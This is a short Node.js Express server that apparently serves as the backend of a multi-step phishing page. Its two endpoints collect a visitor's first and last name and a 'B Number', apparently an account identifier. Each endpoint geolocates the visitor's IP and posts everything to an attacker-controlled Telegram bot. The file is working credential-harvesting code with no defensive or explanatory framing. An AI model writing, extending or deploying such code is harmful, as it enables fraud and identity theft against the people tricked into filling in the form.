import express from "express";
import cors from "cors";
import fetch from "node-fetch";
import dotenv from "dotenv";

dotenv.config();

const app = express();

app.use(cors());
app.use(express.json());

const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

async function sendToTelegram(text) {
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    await fetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
            chat_id: CHAT_ID,
            text
        })
    });
}

async function getIpInfo(ip) {
    try {
        const res = await fetch(`https://ipapi.co/${ip}/json/`);
        return await res.json();
    } catch {
        return {};
    }
}

function getClientIp(req) {
    return (
        req.headers["x-forwarded-for"]?.split(",")[0] ||
        req.socket.remoteAddress
    );
}

app.post("/submit-step1", async (req, res) => {
    const ip = getClientIp(req);
    const info = await getIpInfo(ip);

    const message = `
STEP 1
First Name: ${req.body.fname}
Last Name: ${req.body.lname}

IP: ${ip}
City: ${info.city || "N/A"}
State: ${info.region || "N/A"}
Zip: ${info.postal || "N/A"}
    `;

    await sendToTelegram(message);
    res.sendStatus(200);
});

app.post("/submit-final", async (req, res) => {
    const ip = getClientIp(req);
    const info = await getIpInfo(ip);

    const message = `
FINAL STEP
First Name: ${req.body.fname}
Last Name: ${req.body.lname}
B Number: ${req.body.bnumber}

IP: ${ip}
City: ${info.city || "N/A"}
State: ${info.region || "N/A"}
Zip: ${info.postal || "N/A"}
    `;

    await sendToTelegram(message);
    res.sendStatus(200);
});

app.listen(process.env.PORT);
